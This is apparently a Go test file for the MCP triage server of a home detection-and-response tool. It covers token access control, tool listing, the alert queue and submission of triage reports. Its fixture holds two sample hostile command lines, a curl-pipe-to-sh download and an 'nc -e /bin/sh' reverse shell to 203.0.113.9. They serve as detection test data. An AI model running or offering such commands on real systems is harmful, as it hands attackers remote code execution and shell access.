package mcpserver

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Netdoodle/homexdr/server/internal/events"
	"github.com/Netdoodle/homexdr/server/internal/store"
	"github.com/Netdoodle/homexdr/server/internal/triage"
	"github.com/Netdoodle/homexdr/shared/api"
	"github.com/Netdoodle/homexdr/shared/event"
)

type fixture struct {
	st    *store.Store
	ev    events.Store
	tr    *triage.Service
	srv   *httptest.Server
	token string
	alert *store.Alert
	other *store.Alert
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	ctx := context.Background()
	dir := t.TempDir()
	st, err := store.Open(filepath.Join(dir, "state.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	ev, err := events.OpenSQLite(filepath.Join(dir, "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ev.Close() })
	if _, err := st.CreateEndpoint(ctx, "h1", api.HostInfo{Hostname: "lab-1", OS: event.OS{Platform: "linux"}}, nil, "1"); err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC()
	proc := func(entity, name, cmd string) *event.Event {
		return &event.Event{
			ID: event.NewID(), Timestamp: now.Add(-5 * time.Minute),
			Host:    event.Host{ID: "h1", Name: "lab-1", OS: &event.OS{Platform: "linux"}},
			Event:   event.Meta{Kind: event.KindEvent, Category: []string{"process"}, Type: []string{"start"}, Module: "procconn"},
			Process: &event.Process{EntityID: entity, PID: 10, Name: name, CommandLine: cmd},
		}
	}
	hit, hit2 := proc("e-curl", "curl", "curl http://203.0.113.9/x.sh | sh"), proc("e-nc", "nc", "nc -e /bin/sh 203.0.113.9 4444")
	if err := ev.Insert(ctx, []*event.Event{hit, hit2}); err != nil {
		t.Fatal(err)
	}
	f := &fixture{st: st, ev: ev}
	for i, e := range []*event.Event{hit, hit2} {
		a, _, err := st.RecordAlert(ctx, store.AlertInput{
			Rule:     store.AlertRule{ID: "r" + string(rune('1'+i)), Title: "Suspicious " + e.Process.Name, Level: store.SevHigh},
			Severity: store.SevHigh, Event: e,
		})
		if err != nil {
			t.Fatal(err)
		}
		if i == 0 {
			f.alert = a
		} else {
			f.other = a
		}
	}
	f.tr = triage.New(st, ev, slog.New(slog.NewTextHandler(io.Discard, nil)))
	tok, err := st.CreateMCPToken(ctx, "test laptop", "admin")
	if err != nil {
		t.Fatal(err)
	}
	f.token = tok.Token
	mux := http.NewServeMux()
	h := New(st, f.tr, slog.New(slog.NewTextHandler(io.Discard, nil)))
	mux.Handle("/mcp", h)
	mux.Handle("/mcp/", h)
	f.srv = httptest.NewServer(mux)
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fixture) settings(t *testing.T, mut func(*triage.Settings)) {
	t.Helper()
	set := f.tr.Settings(context.Background())
	mut(&set)
	if _, err := f.tr.SaveSettings(context.Background(), set); err != nil {
		t.Fatal(err)
	}
}

func (f *fixture) do(t *testing.T, method, path, body string, hdr map[string]string) (*http.Response, string) {
	t.Helper()
	req, _ := http.NewRequest(method, f.srv.URL+path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+f.token)
	for k, v := range hdr {
		if v == "" {
			req.Header.Del(k)
		} else {
			req.Header.Set(k, v)
		}
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp, string(b)
}

// call makes a JSON-RPC request and returns its result.
func (f *fixture) call(t *testing.T, method string, params any) map[string]any {
	t.Helper()
	p, _ := json.Marshal(params)
	resp, body := f.do(t, "POST", "/mcp", `{"jsonrpc":"2.0","id":7,"method":"`+method+`","params":`+string(p)+`}`, nil)
	if resp.StatusCode != 200 {
		t.Fatalf("%s: HTTP %d %s", method, resp.StatusCode, body)
	}
	var out struct {
		ID     int            `json:"id"`
		Result map[string]any `json:"result"`
		Error  *rpcError      `json:"error"`
	}
	if err := json.Unmarshal([]byte(body), &out); err != nil || out.ID != 7 {
		t.Fatalf("%s: bad response %s", method, body)
	}
	if out.Error != nil {
		t.Fatalf("%s: error %+v", method, out.Error)
	}
	return out.Result
}

// tool calls a tool and returns its text and isError.
func (f *fixture) tool(t *testing.T, name string, args any) (string, bool) {
	t.Helper()
	res := f.call(t, "tools/call", map[string]any{"name": name, "arguments": args})
	content := res["content"].([]any)
	return content[0].(map[string]any)["text"].(string), res["isError"].(bool)
}

var report = map[string]any{
	"verdict": "malicious", "confidence": "high", "severity_assessment": "high",
	"summary": "curl piped a remote script into sh.", "analysis": "Downloaded and ran a script.",
	"evidence": []any{}, "mitre": []any{}, "recommended_actions": []any{}, "open_questions": []any{},
}

func withAlert(id string) map[string]any {
	m := map[string]any{"alert_id": id}
	for k, v := range report {
		m[k] = v
	}
	return m
}

func TestAccessControl(t *testing.T) {
	f := newFixture(t)
	if resp, _ := f.do(t, "POST", "/mcp", `{}`, map[string]string{"Authorization": ""}); resp.StatusCode != 401 || resp.Header.Get("WWW-Authenticate") == "" {
		t.Fatalf("no token: %d", resp.StatusCode)
	}
	if resp, _ := f.do(t, "POST", "/mcp", `{}`, map[string]string{"Authorization": "Bearer hxm_wrong"}); resp.StatusCode != 401 {
		t.Fatalf("bad token: %d", resp.StatusCode)
	}
	if resp, body := f.do(t, "POST", "/mcp", `{}`, nil); resp.StatusCode != 403 || !strings.Contains(body, "turned off") {
		t.Fatalf("MCP off: %d %s", resp.StatusCode, body)
	}
	f.settings(t, func(s *triage.Settings) { s.MCPEnabled = true })
	if resp, _ := f.do(t, "POST", "/mcp", `{}`, map[string]string{"Origin": "http://evil.example"}); resp.StatusCode != 403 {
		t.Fatalf("cross-origin: %d", resp.StatusCode)
	}
	if resp, _ := f.do(t, "GET", "/mcp", ``, nil); resp.StatusCode != 405 {
		t.Fatalf("GET: %d", resp.StatusCode)
	}
	if resp, _ := f.do(t, "POST", "/mcp", `{"jsonrpc":"2.0","method":"notifications/initialized"}`, nil); resp.StatusCode != 202 {
		t.Fatalf("notification: %d", resp.StatusCode)
	}
	// A revoked token stops working.
	toks, _ := f.st.ListMCPTokens(context.Background())
	if err := f.st.DeleteMCPToken(context.Background(), toks[0].ID); err != nil {
		t.Fatal(err)
	}
	if resp, _ := f.do(t, "POST", "/mcp", `{}`, nil); resp.StatusCode != 401 {
		t.Fatalf("revoked: %d", resp.StatusCode)
	}
}

func TestInitializeAndTools(t *testing.T) {
	f := newFixture(t)
	f.settings(t, func(s *triage.Settings) { s.MCPEnabled = true })
	res := f.call(t, "initialize", map[string]any{"protocolVersion": "2025-03-26",
		"clientInfo": map[string]any{"name": "claude-code", "version": "2.1.0"}, "capabilities": map[string]any{}})
	if res["protocolVersion"] != "2025-03-26" || !strings.Contains(res["instructions"].(string), "next_investigation") {
		t.Fatalf("initialize: %v", res)
	}
	tools := map[string]map[string]any{}
	for _, x := range f.call(t, "tools/list", map[string]any{})["tools"].([]any) {
		m := x.(map[string]any)
		tools[m["name"].(string)] = m
	}
	for _, name := range []string{"next_investigation", "get_alert", "submit_triage", "search_events", "get_process_tree", "list_alerts"} {
		if tools[name] == nil {
			t.Errorf("tool %s missing", name)
		}
	}
	req := tools["submit_triage"]["inputSchema"].(map[string]any)["required"].([]any)
	if req[0] != "alert_id" {
		t.Errorf("submit_triage required: %v", req)
	}
	if out, isErr := f.tool(t, "search_events", map[string]any{"query": "process.name:curl"}); isErr || !strings.Contains(out, "x.sh") {
		t.Errorf("search_events: %v %s", isErr, out)
	}
	if out, isErr := f.tool(t, "get_alert", map[string]any{"alert_id": "nope"}); !isErr || !strings.Contains(out, "no alert") {
		t.Errorf("get_alert missing: %v %s", isErr, out)
	}
	// Batches (older protocol versions) get an array back.
	_, body := f.do(t, "POST", "/mcp", `[{"jsonrpc":"2.0","id":1,"method":"ping"},{"jsonrpc":"2.0","method":"notifications/x"}]`, nil)
	if !strings.HasPrefix(body, "[") || !strings.Contains(body, `"id":1`) {
		t.Errorf("batch: %s", body)
	}
}

func TestQueueAndInvestigate(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	f.settings(t, func(s *triage.Settings) {
		s.MCPEnabled, s.Engine, s.MCPAutoTrigger = true, store.EngineMCP, true
	})
	f.call(t, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "claude-code", "version": "2.1.0"}})

	// A new alert is queued for MCP, not for the server's own worker.
	f.tr.AlertCreated(ctx, f.alert)
	if _, err := f.st.ClaimTriage(ctx, store.EngineAPI); err == nil {
		t.Fatal("API worker claimed an MCP investigation")
	}
	resp, body := f.do(t, "GET", "/mcp/status", "", map[string]string{"X-HomeXDR-Runner": "desktop"})
	var st map[string]any
	_ = json.Unmarshal([]byte(body), &st)
	if resp.StatusCode != 200 || st["pending"] != float64(1) || st["run"] != true {
		t.Fatalf("status: %d %s", resp.StatusCode, body)
	}
	if name, at := f.tr.Runner(); name != "desktop" || at.IsZero() {
		t.Errorf("runner not recorded: %q", name)
	}

	out, isErr := f.tool(t, "next_investigation", map[string]any{})
	if isErr || !strings.Contains(out, f.alert.ID) || !strings.Contains(out, "<instructions>") || !strings.Contains(out, "x.sh") {
		t.Fatalf("next_investigation: %v %s", isErr, out)
	}
	if tr, _ := f.st.GetTriage(ctx, f.alert.ID); tr.Status != store.TriageRunning || tr.Engine != store.EngineMCP {
		t.Fatalf("not running: %+v", tr)
	}
	f.tool(t, "get_process_tree", map[string]any{"host_id": "h1", "entity_id": "e-curl"})
	if out, isErr := f.tool(t, "submit_triage", map[string]any{"alert_id": f.alert.ID, "verdict": "maybe"}); !isErr || !strings.Contains(out, "verdict") {
		t.Fatalf("invalid report accepted: %s", out)
	}
	if out, isErr := f.tool(t, "submit_triage", withAlert(f.alert.ID)); isErr {
		t.Fatalf("submit: %s", out)
	}
	tr, err := f.st.GetTriage(ctx, f.alert.ID)
	if err != nil || tr.Status != store.TriageDone || tr.Verdict != "malicious" || tr.Provider != "mcp" ||
		tr.Model != "claude-code 2.1.0" || tr.ToolCalls != 1 || !strings.Contains(string(tr.Transcript), "get_process_tree") {
		t.Fatalf("triage after submit: %+v", tr)
	}
	if out, _ := f.tool(t, "next_investigation", map[string]any{}); !strings.Contains(out, "No alerts are waiting") {
		t.Fatalf("queue not empty: %s", out)
	}
	// The alert itself is untouched: annotate only.
	if a, _ := f.st.GetAlert(ctx, f.alert.ID); a.Status != f.alert.Status || a.Severity != f.alert.Severity {
		t.Fatalf("alert changed: %+v", a)
	}

	// Any alert can be triaged on request, without a queue entry.
	if out, isErr := f.tool(t, "submit_triage", withAlert(f.other.ID)); isErr {
		t.Fatalf("ad hoc submit: %s", out)
	}
	if tr, _ := f.st.GetTriage(ctx, f.other.ID); tr.Status != store.TriageDone || tr.RequestedBy != "mcp:test laptop" {
		t.Fatalf("ad hoc triage: %+v", tr)
	}
}

func TestAutoTriggerOff(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	f.settings(t, func(s *triage.Settings) { s.MCPEnabled, s.Engine = true, store.EngineMCP })
	f.tr.AlertCreated(ctx, f.alert)
	if n := f.tr.PendingMCP(ctx); n != 0 {
		t.Fatalf("queued with auto-trigger off: %d", n)
	}
	// A manual request still goes to MCP.
	if _, err := f.tr.Request(ctx, f.alert.ID, "admin"); err != nil {
		t.Fatal(err)
	}
	if n := f.tr.PendingMCP(ctx); n != 1 {
		t.Fatalf("manual request not queued: %d", n)
	}
	// An MCP investigation with no report for too long is failed, not requeued.
	if _, err := f.st.ClaimTriage(ctx, store.EngineMCP); err != nil {
		t.Fatal(err)
	}
	if n, err := f.st.FailStaleTriages(ctx, store.EngineMCP, time.Now().Add(time.Minute), "timed out"); err != nil || n != 1 {
		t.Fatalf("fail stale: %d %v", n, err)
	}
	if tr, _ := f.st.GetTriage(ctx, f.alert.ID); tr.Status != store.TriageFailed {
		t.Fatalf("stale: %+v", tr)
	}
}
